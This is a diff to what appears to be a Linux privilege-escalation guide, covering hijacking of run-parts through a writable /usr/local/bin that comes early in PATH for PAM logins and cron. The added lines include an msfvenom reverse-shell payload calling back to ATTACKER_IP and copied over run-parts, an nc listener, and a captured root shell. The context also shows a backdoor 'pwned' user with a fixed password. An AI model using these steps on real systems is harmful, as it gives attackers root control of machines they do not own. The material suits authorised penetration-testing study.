@@ -2452,17 +2452,23 @@ find /usr/local -type d -group staff -writable 2>/dev/null
 
 **Exploitation via run-parts Hijacking:**
 
-When users log in, PAM runs `run-parts` to execute scripts. If `/usr/local/bin` is writable and before `/bin` in PATH:
+When users log in, PAM may run `run-parts` to execute scripts. Cron can expose the same issue if `/etc/crontab` sets a PATH with `/usr/local/bin` before `/usr/bin` or `/bin`, and then calls `run-parts` without an absolute path.
 
 ```bash
 # Check PATH order
 echo $PATH
 # /usr/local/bin:/usr/bin:/bin:...
 
+# Check cron PATH order
+cat /etc/crontab
+# SHELL=/bin/sh
+# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
 # Monitor for processes (use pspy)
 ./pspy64
 # Look for: /bin/sh -c /root/bin/cleanup.pl
 # Or PAM session scripts calling run-parts
+# Or cron calling: /bin/sh -c cd / && run-parts --report /etc/cron.hourly
 ```
 
 **Create malicious run-parts:**
@@ -2477,7 +2483,15 @@ EOF
 chmod +x /usr/local/bin/run-parts
 ```
 
-**Trigger:**
+Reverse shell payload variant:
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=3000 -f elf -o /tmp/shell.elf
+cp /tmp/shell.elf /usr/local/bin/run-parts
+chmod +x /usr/local/bin/run-parts
+```
+
+**Trigger via login:**
 
 ```bash
 # Log out and log back in via SSH
@@ -2490,6 +2504,28 @@ cat /etc/passwd | grep pwned
 # Switch to root
 su pwned
 # Password: pwned123
+```
+
+**Trigger via cron:**
+
+Wait for the scheduled job that calls `run-parts`:
+
+```text
+CMD: UID=0 | /bin/sh -c cd / && run-parts --report /etc/cron.hourly
+```
+
+Catch the callback:
+
+```bash
+nc -nlvp 3000
+```
+
+Successful root shell:
+
+```text
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 **Pre-generated password hashes:**
